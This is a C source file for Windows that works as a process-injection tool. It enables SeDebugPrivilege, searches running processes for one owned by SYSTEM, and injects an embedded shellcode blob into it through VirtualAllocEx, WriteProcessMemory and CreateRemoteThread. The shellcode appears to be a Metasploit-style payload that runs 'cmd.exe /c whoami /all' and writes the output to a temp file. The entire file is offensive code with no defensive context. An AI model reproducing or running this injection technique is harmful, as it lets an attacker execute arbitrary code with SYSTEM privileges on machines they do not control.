#include <windows.h>
#include <tlhelp32.h>
#include <winnt.h>
#include <sddl.h>
#include <ntsecapi.h>
#include <stdio.h>

BOOL WsidQmark(PSID eseaydee) {
    BOOL result = FALSE;
    PSID systemSid = NULL;

    if (!ConvertStringSidToSidA("S-1-5-18", &systemSid)) { // SID we want the target process to have (filter)
        return FALSE; // Conversion failed
    }

    if (EqualSid(eseaydee, systemSid)) {
        result = TRUE;
    }

    LocalFree(systemSid);
    return result;
}

unsigned char shellcode[] = 
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
"\xd5\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x77\x68"
"\x6f\x61\x6d\x69\x20\x2f\x61\x6c\x6c\x20\x3e\x20\x43\x3a"
"\x5c\x74\x65\x6d\x70\x5c\x77\x68\x6f\x61\x6e\x65\x77\x2e"
"\x74\x78\x74\x00";


int main() {
    printf("Begin\n"); fflush(stdout);
    HANDLE currentProcessToken;
    LUID SeDbgPrivilegeLuid;
    TOKEN_PRIVILEGES currentTokenPrivs;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentProcessToken)) {
        printf("[-] Failed to open process token\nError code : %d\n", GetLastError()); 
        fflush(stdout);
        return -1;
    }
    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &SeDbgPrivilegeLuid);

    currentTokenPrivs.PrivilegeCount = 1;
    currentTokenPrivs.Privileges->Luid = SeDbgPrivilegeLuid;

    if (!AdjustTokenPrivileges(currentProcessToken, FALSE, &currentTokenPrivs, 0, NULL, NULL)) { 
        printf("[-] Failed to enable SeDebugPrivilege\nError code : %d\n", GetLastError()); 
        fflush(stdout);
        return -1;
    } else { 
        printf("[+] Successfully enabled SeDebugPrivilege on current token\n"); 
        fflush(stdout);
    }

    PROCESSENTRY32 hProc;
    hProc.dwSize = sizeof(PROCESSENTRY32);
    HANDLE hToken1;
    DWORD neededSize;
    HANDLE snapshot1;
    if (!(snapshot1 = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0))){
        printf("[-] Failed to make a snapshot\nError code : %d\n", GetLastError()); 
        fflush(stdout);
        return -1;
    } else { 
        printf("[+] Successfully made a snapshot\n"); 
        fflush(stdout);
    }

    if (!( Process32First(snapshot1, &hProc) )){
        printf("[-] Failed to go to first\nError code : %d\n", GetLastError()); 
        fflush(stdout);
        return -1;
    } else { 
        printf("[+] Successfully went to first\n"); 
        fflush(stdout);
    }

    do {
        HANDLE hProc2;
        if (!( hProc2 = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD, FALSE, hProc.th32ProcessID) )){
            printf("[!] Failed opening process %s\n  -> Error code : %d\n", hProc.szExeFile, GetLastError()); 
            fflush(stdout);
            continue;
        } else { 
            printf("\n[+] Successfully opened process %s \n", hProc.szExeFile); 
            fflush(stdout);
        }

        if (!(  OpenProcessToken(hProc2, TOKEN_ALL_ACCESS, &hToken1) )){
            printf("[-] Failed to OpenProcessToken\nError code : %d\n", GetLastError()); 
            fflush(stdout);
            return -1;
        } else { 
            printf("[+] Successfully Opened ProcessTOken\n"); 
            fflush(stdout);
        }


        
        if (!( GetTokenInformation(hToken1, TokenUser, NULL, 0, &neededSize) )){
            printf("[-] Failed to GetTokenInformation\nError code : %d\n", GetLastError()); 
            fflush(stdout);

        } else { 
            printf("[+] Successfully got token information\n"); 
            fflush(stdout);
        }
        BYTE * BUFFER = malloc(neededSize);
        ZeroMemory(BUFFER, sizeof(neededSize));
        
        if (!( GetTokenInformation(hToken1, TokenUser, BUFFER, neededSize, &neededSize) )){
            printf("[-] Failed to getokinfo2\nError code : %d\n", GetLastError()); 
            fflush(stdout);
            return -1;
        } else { 
            printf("[+] Successfully got token info2 \n"); 
            fflush(stdout);
        }
        TOKEN_USER * hToken2 = (TOKEN_USER *)BUFFER;

        if(WsidQmark(hToken2->User.Sid)) {
            LPVOID remoteMemory1;
            HANDLE hRemoteThread;

            if (!(remoteMemory1 = VirtualAllocEx(hProc2, NULL, 2048, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE))) {
                CloseHandle(hProc2);
                CloseHandle(hToken1);
                printf("[!] Failed allocating memory\n  -> Error code : %d\n", GetLastError());
                fflush(stdout);
                continue;
            } else { printf("[+] Success while allocating remote memory\n");fflush(stdout); }
            if(!WriteProcessMemory(hProc2, remoteMemory1, shellcode, sizeof(shellcode), NULL)) {
                printf("[!] Failed writing memory\n  -> Error code : %d\n", GetLastError());
                fflush(stdout);
                continue;
            } else { printf("[+] Success while writing remote memory\n"); }
            if (!(hRemoteThread = CreateRemoteThread(hProc2, NULL, 0, remoteMemory1, NULL, CREATE_SUSPENDED, NULL))) {
                printf("[!] Failed creating remote thread\n  -> Error code : %d\n", GetLastError());
                fflush(stdout);
                continue;
            } else { printf("[+] Success while creating remote thread\n"); fflush(stdout); }

            printf("[~] Attempting to start remote thread . . .\n");
            fflush(stdout);

            if (!ResumeThread(hRemoteThread)) {
                printf("[!] Failed creating remote thread\n  -> Error code : %d\n", GetLastError());
                fflush(stdout);
                continue;
            } else { printf("[ +++ ] Remote thread started\n"); fflush(stdout); return 0; }

        } else { printf("  -> The SID doesn't match defined SID\n"); fflush(stdout); continue; }

    } while ( Process32Next(snapshot1, &hProc) );


        return 1;
}
